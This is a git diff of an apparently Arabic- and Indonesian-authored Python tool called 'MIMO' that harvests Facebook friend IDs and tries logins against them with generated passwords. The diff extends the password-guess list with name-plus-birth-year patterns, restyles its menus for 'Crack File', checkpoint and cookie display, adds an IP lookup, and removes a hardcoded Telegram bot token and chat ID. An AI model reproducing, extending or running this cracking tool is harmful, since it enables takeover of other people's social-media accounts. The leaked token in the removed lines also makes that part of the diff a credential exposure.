@@ -87,16 +87,23 @@ try:
     from cfonts import render, say
 except:
     os.system('pip install python-cfonts')
+time1 = time.localtime()
+time2 = time.strftime('''%d/%m/%Y''')
+print('')
+time3 = time.strftime('''%H:%M:%S''')
 print(('\x1b[1;31m▬'*80)+'\n\n'+('\x1b[1;31m▬'*80))
-output = render('M I M O', colors=['red', 'blue'], align='center')
+output = render('M I M O', colors=['white', 'blue'], align='center')
 print(output)
 print(('\x1b[1;31m▬'*80)+'\n\n'+('\x1b[1;31m▬'*80))
 print('\n')
+print('')
+print(f'''{C}: \x1b[38;5;92m 𝐓𝐇𝐄 𝐃𝐀𝐓𝐄 \x1b[1;38;5;121m ๛   \x1b[1;38;5;121m   𖣎 \x1b[1;96m{time2} \x1b[1;38;5;121m 𖣎''')
+print('')
+print(f'''{C}: \x1b[38;5;92m 𝑇𝐻𝐸 𝑇𝐼𝑀𝐸 \x1b[1;38;5;121m ๛   \x1b[1;38;5;121m   𖣎 \x1b[1;96m{time3} \x1b[1;38;5;121m 𖣎''')
+print('')
 token = input('\x1b[1;31mT\x1b[1;32mO\x1b[1;33mK\x1b[1;34mE\x1b[1;36mN\x1b[1;35m :\x1b[1;32m ')
-token1=('6713135240:AAFxpnxCwVH5R1n4s6Zq7uY7Ploluy7kFQU') 
 print('\n')
 ID = input('\x1b[1;31mI\x1b[1;34mD \x1b[1;32m   : ')
-ID1=('1677652563') 
 print(('—'*25)+'\n\n'+('—'*25))
 tlg1 = '\n -مرحب بك في اداة المطور ميمو\n𓅃━━━━━━━━❖━━━━━━━━━nn𝞩 \nتم تشغيل الاداة \n    \nلا تـنسى ان تـرسل صـور الـصيد -  @mx1mq\n\n '
 requests.get('https://api.telegram.org/bot' + str(token) + '/sendMessage?chat_id=' + str(ID) + '&text=' + str(tlg1))
@@ -236,7 +243,69 @@ u = '\033[95m' # UNGU
 kk = '\033[33m' # KUNING -
 b = '\33[1;96m' # BIRU -
 p = '\x1b[0;34m' # BIRU +
-asu = random.choice([m,k,h,u,b])
+xxh = '\x1b[38;5;208m'#برتقالي
+r1='\x1b[38;5;8m'#رمادي
+m1='\x1b[38;5;196m'#احمر
+a1 = '\x1b[1;31m'  # أحمر
+a2 = '\x1b[1;34m'  # أزرق
+a3 = '\x1b[1;32m'  # أخضر
+a4 = '\x1b[1;33m'  # أصفر
+a5 = '\x1b[38;5;208m'  # برتقالي
+a6 = '\x1b[38;5;5m'  # أرجواني
+a7 = '\x1b[38;5;13m'  # وردي
+a8 = '\x1b[1;30m'  # أسود
+a9 = '\x1b[1;37m'  # أبيض
+a10 = '\x1b[38;5;52m'  # بني
+a11 = '\x1b[38;5;8m'  # رمادي
+a12 = '\x1b[38;5;220m'  # ذهبي
+a13 = '\x1b[38;5;7m'  # فضي
+a14 = '\x1b[38;5;153m'  # أزرق فاتح
+a15 = '\x1b[38;5;18m'  # أزرق داكن
+a16 = '\x1b[38;5;48m'  # أخضر فاتح
+a17 = '\x1b[38;5;22m'  # أخضر داكن
+a18 = '\x1b[38;5;196m'  # أحمر فاتح
+a19 = '\x1b[38;5;88m'  # أحمر داكن
+a20 = '\x1b[38;5;226m'  # أصفر فاتح
+a21 = '\x1b[38;5;136m'  # أصفر داكن
+a22 = '\x1b[38;5;216m'  # برتقالي فاتح
+a23 = '\x1b[38;5;166m'  # برتقالي داكن
+a24 = '\x1b[38;5;234m'  # أرجواني فاتح
+a25 = '\x1b[38;5;91m'  # أرجواني داكن
+a26 = '\x1b[38;5;205m'  # وردي فاتح
+a27 = '\x1b[38;5;161m'  # وردي داكن
+a28 = '\x1b[38;5;236m'  # أسود فاتح
+a29 = '\x1b[38;5;233m'  # أسود داكن
+a30 = '\x1b[38;5;255m'  # أبيض فاتح
+a31 = '\x1b[38;5;231m'  # أبيض داكن
+a32 = '\x1b[38;5;180m'  # بني فاتح
+a33 = '\x1b[38;5;94m'  # بني داكن
+a34 = '\x1b[38;5;252m'  # رمادي فاتح
+a35 = '\x1b[38;5;246m'  # رمادي داكن
+a36 = '\x1b[38;5;228m'  # ذهبي فاتح
+a37 = '\x1b[38;5;172m'  # ذهبي داكن
+a38 = '\x1b[38;5;188m'  # فضي فاتح
+a39 = '\x1b[38;5;247m'  # فضي داكن
+a40 = '\x1b[38;5;117m'  # أزرق سماوي
+P = '\x1b[1;97m'
+M = '\x1b[1;91m'
+H = '\x1b[1;92m'
+K = '\x1b[1;93m'
+B = '\x1b[1;94m'
+U = '\x1b[1;95m' 
+O = '\x1b[1;96m'
+N = '\x1b[0m'    
+Z = "\033[1;30m"
+sir = '\033[41m\x1b[1;97m'
+x = '\33[m' # DEFAULT
+m = '\x1b[1;91m' #RED +
+k = '\033[93m' # KUNING +
+h = '\x1b[1;92m' # HIJAU +
+hh = '\033[32m' # HIJAU -
+u = '\033[95m' # UNGU
+kk = '\033[33m' # KUNING -
+b = '\33[1;96m' # BIRU -
+p = '\x1b[0;34m' # BIRU +
+asu = random.choice([a3,a4,a5,a6,a7,a10,a12,a14,u,k,kk,b,h,hh,a19,a20,a21,a22,a23,a24,a25,a26,a27,a36,a37,a40,xxh,])
 #--------------------[ 𝙼𝙸𝙼𝙾]--------------#
 dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
 dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
@@ -648,7 +717,7 @@ def back():
 	llogin()
 
 def banner():
-	print(f'''BY = @mx1mq''')
+	print(f'''''')
 
 def llogin():
 	try:
@@ -825,28 +894,42 @@ def menu(my_name,my_id):
 	
 	os.system('clear')
 	banner()
-	print(('\x1b[95m▬'*100)+'\n\n'+('\x1b[1;31m▬'*100))
-	output = render('M I M O', colors=['blue' ,'red'], align='center')
+	print(('\033[2;32m▬'*100)+'\n\n'+('\x1b[1;31m▬'*100))
+	output = render('M I M O', colors=['white' ,'red'], align='center')
 	print(output)
-	print(('\x1b[38;5;208m▬'*100)+'\n\n'+('\x1b[1;31m▬'*100))
+	print(('\x1b[38;5;225m▬'*100)+'\n\n'+('\x1b[1;31m▬'*100))
 	print('\n')
 	
+	print('\n   \033[0m\033[1;93m [\033[1;93m\033[1;44m  𝗜𝗢𝗚i𝗡 i𝗡𝗙𝗢  :  معلومات المستخدم\033[0m\033[1;93m]\n')
+	print("\x1b[1;92m[\x1b[0m✔\x1b[1;92m] \x1b[0m 𝐘𝐎𝗨𝐑 𝐈𝐃 ⚡️ : "+str(my_id)) 
+	print("\x1b[1;92m[\x1b[0m✔\x1b[1;92m] \x1b[0m 𝐍𝐀𝐌𝐄 ℡    : "+str(my_name))
+	try:
+		gep = requests.get('http://ipinfo.io/json').json()
+		print("%s[%s✔%s]%s  𝗖i𝗧𝗬   :%s %s"%(H,P,H,P,K,gep['region']))
+		print("%s[%s✔%s]%s  IP      :%s %s\n"%(H,P,H,P,K,gep['ip']))
+	
+	except:
+		print("%s[%s✔%s]%s 𝗖i𝗧𝗬 :%s -"%(H,P,H,P,K))
+		print("%s[%s✔%s]%s IP :%s -"%(H,P,H,P,K))
+
+	print('\033[2;35m')
+	g67 = '\x1b[38;5;161m'
+	print(g67+'▬'*67)
+	print('\n   \033[0m\033[1;93m [\033[1;92m\033[1;44m  𝐓𝐇𝐄 𝐏𝐑𝐎𝐆𝐑𝐀𝐌𝐌𝐄𝐑     \033[0m\033[1;93m]\n')
+	print('  \x1b[38;5;117m{\x1b[1;32m•\x1b[38;5;117m}\x1b[38;5;133m 𝑇𝐸l𝐸 \x1b[38;5;230m ⁞ \x1b[38;5;153m@mx1mq')
+	print('\x1b[38;5;230m')
+	print('  \x1b[38;5;117m{\x1b[1;32m•\x1b[38;5;117m} \x1b[38;5;133m𝐂𝐇𝐀𝐍𝐍𝐄l \x1b[38;5;230m ⁞ \x1b[38;5;153m @MIMO X VIP  ')
 	print('')
-	print(F+'『 』⇣ |')
-	print('\x1b[38;5;208m▬'*80)
-	print(f'[ * ] Your ID : '+str(my_id))
-	print(f'[ * ] Your IP : {ip}')
-	print('\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m')
-	print('[ + ] 1- Fishing From Friends : صيد من الاصدقاء  ')
-	print('\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m')
-	#print('» 2- Fishing from followers : من المتابعين ')
-	#print('.')
-	print('[ + ]  2- Crack File : مــن مــلــف  ')
-	print('\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m')		
-	print('[ + ]  0- Login Out : تغير الكوكيز')
-	print('\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m')
+	print(g67+'━'*67)
+	print('  {\x1b[1;32m1\x1b[1;36m} \x1b[38;5;208m𝐅𝐑𝐈𝐄𝐍𝐃𝐒     :  من الاصدقاء     ')
+	print(g67+'━'*67)
+	print('  {\x1b[1;32m2\x1b[1;36m} \x1b[38;5;208m𝐅𝐑𝐎𝐌 𝐅𝐈l𝐄  :     من ملف    ')
+	
+	print(g67+'━'*67)
+	print('  {\x1b[1;32m0\x1b[1;36m} \x1b[38;5;196m𝐄𝐗𝐈𝐓       :   تسجيل خروج    ')
+	print(g67+'━'*67)
 		
-	_____alvino__adijaya_____ = input('\n[=] [ - ]\x1b[1;32m chose : ')
+	_____alvino__adijaya_____ = input('\n[=] \x1b[1;32m 𝗖𝗛𝗢𝗦𝗘 ๛ : ')
 	if _____alvino__adijaya_____ in ['1']:
 		dump_massal()
 	elif _____alvino__adijaya_____ in ['3']:
@@ -864,7 +947,7 @@ def follower():
 	except IOError:
 		exit()
 	try:
-		jum = int(input('\x1b[1;31m[>>]ID LIMIT : اكتب عدد الايديات '))
+		jum = int(input('\x1b[1;31m[>>] 𝐈𝐃 D LIMIT : اكتب عدد الايديات '))
 	except ValueError:
 		print('{k}[✖] NOT PUBLIC ID ')
 		time.sleep(3)
@@ -877,7 +960,7 @@ def follower():
 	yz = 0
 	for met in range(jum):
 		yz+=1		
-		kl = input('[*] ID >> '+str(yz)+' : ')
+		kl = input('\033[1;34m>>>  𝐈𝐃  >> '+str(yz)+' : ')
 		uid.append(kl)
 	for userr in uid:
 		try:
@@ -923,7 +1006,7 @@ def dump_massal():
 	except IOError:
 		exit()
 	try:
-		jum = int(input('\x1b[1;31m>> MANY ID : '))
+		jum = int(input('\x1b[38;5;225m>> MANY  𝐈𝐃  : '))
 	except ValueError:
 		print('>> Masukkan Angka Anjing, Malah Huruff ')
 		exit()
@@ -934,7 +1017,7 @@ def dump_massal():
 	yz = 0
 	for met in range(jum):
 		yz+=1
-		kl = input('>> ID '+str(yz)+' : ')
+		kl = input('\x1b[38;5;161m>>  𝐈𝐃  '+str(yz)+' : ')
 		uid.append(kl)
 	for user in uid:
 	    try:
@@ -968,7 +1051,7 @@ def dump_massal():
 	        exit()
 	try:
 		print('')
-		print(f'» ID | عدد الايديات {h}'+str(len(id)))
+		print(f'\x1b[38;5;8m,»  𝐈𝐃  | عدد الايديات {h}'+str(len(id)))
 		setting()
 	except requests.exceptions.ConnectionError:
 		print(f'{x}')
@@ -980,11 +1063,11 @@ def dump_massal():
 		back()
 
 def setting():
-	print('\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m')
-	print('[٭] \033[1;95m ➙ [ 1 ]➙MIX [Old + New] - ID')
+	print(f'\033[1;34m══════════════════════════════════════════════════════════')
+	print(' \033[1;95m [ 1 ] ➙ MIX -  𝐈𝐃  ')
 	
 	print('')
-	hu = input('\x1b[1;32m» Chose : ')
+	hu = input('\x1b[1;32m» 𝗖𝗛𝗢𝗦𝗘 ๛ : ')
 	if hu in ['3','03']:
 		for tua in sorted(id):
 			id2.append(tua)
@@ -1005,13 +1088,13 @@ def setting():
 	else:
 		print('>> PILIH YANG BENAR BANG ')
 		exit()
-	print('\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m')
-	print(L+ '\033[1;95m[ 1 ] ➙ SHOW CP ')
+	print(f'\033[1;34m══════════════════════════════════════════════════════════')
+	print(L+ '\033[1;95m [ 1 ] ➙ SHOW CP ')
 #	print('>> 2. Mbasic ')
 #	print('>> 3. Touch  ')
 #	print('>> 4. Mtouch ')
 	print('')
-	hc = input('\x1b[1;32m » Chose : ')
+	hc = input('\x1b[1;32m » 𝗖𝗛𝗢𝗦𝗘 ๛ : ')
 	if hc in ['1','01']:
 		method.append('mobile')
 	elif hc in ['']:
@@ -1025,11 +1108,11 @@ def setting():
 		method.append('mbasic')
 	else:
 		method.append('mobile')
-	print('\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m')
+	print(f'\033[1;34m══════════════════════════════════════════════════════════')
 	
-	print('\033[1;95m➙[ 1 ] ➙Show cookies - اظهار الكوكيز')
+	print('\033[1;95m [ 1 ] ➙ Show cookies - اظهار الكوكيز')
 	print('')
-	_jembot_ = input('\x1b[1;32m➙ Choose :')
+	_jembot_ = input('\x1b[1;32m➙ 𝗖𝗛𝗢𝗦𝗘 ๛ :')
 	if _jembot_ in ['']:
 		print('>> Pilih Yang Bener Kontol ')
 		back()
@@ -1037,9 +1120,9 @@ def setting():
 		taplikasi.append('ya')
 	else:
 		taplikasi.append('no')
-	print('\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m\x1b[1;31m▬\x1b[1;37m')
-	print('➙\x1b[95m[ 1 ]➙Password - باسورد عشوائي')
-	pwplus=input('\x1b[1;32m➙ Choose :')
+	print(f'\033[1;34m══════════════════════════════════════════════════════════')
+	print('\x1b[95m [ 1 ] ➙ Password - باسورد عشوائي')
+	pwplus=input('\x1b[1;32m➙ 𝗖𝗛𝗢𝗦𝗘 ๛ :')
 	if pwplus in ['2','2']:
 		pwpluss.append('ya')
 		cetak(nel('[[cyan]•[white]] Masukkan Katasandi Tambahan Minimal 6 Karakter\n[[cyan]•[white]] Contoh :[green] kakak,ngentod,adik[white] '))
@@ -1066,13 +1149,30 @@ def passwrd():
 					pwv.append(frs + frs)
 					pwv.append(frs +' '+frs)
 					pwv.append('first last')
+					pwv.append('firstlast')
 					pwv.append('last last')
 					pwv.append(frs + '1234')
 					pwv.append(frs + '123456')
 					pwv.append(frs + '12')
+					pwv.append(frs + '123')
 					pwv.append(frs + '2021')
 					pwv.append(frs + '2022')
 					pwv.append(frs + '2020')
+					pwv.append('last 2005')
+					pwv.append('last 2004')
+					pwv.append('last 2003')
+					pwv.append('last 2002')
+					pwv.append('last 2001')
+					pwv.append('last 2000')
+					pwv.append('last 2006')
+					pwv.append('last 1994')
+					pwv.append('last 2008')
+					pwv.append('last 2007')
+					pwv.append('last 1999')
+					pwv.append('last 1995')
+					pwv.append('last@1994')
+					pwv.append('last 1998')
+					pwv.append('last 1997')
 					pwv.append(frs + '2005')
 					pwv.append(frs + '2004')
 					pwv.append(frs + '2003')
@@ -1080,16 +1180,19 @@ def passwrd():
 					pwv.append(frs + '2001')
 					pwv.append(frs + '2000')
 					pwv.append(frs + '2006')
-					pwv.append(frs + '2009')
+					pwv.append(frs + '1994')
 					pwv.append(frs + '2008')
 					pwv.append(frs + '2007')
 					pwv.append(frs + '1999')
+					pwv.append(frs + '1995')
+					pwv.append(frs + '@1994')
 					pwv.append(frs + '1998')
 					pwv.append(frs + '1997')
 					pwv.append(frs + '1212')
 					pwv.append('12345@12345')
-					pwv.append('123@123')
+					pwv.append('1994@1994')
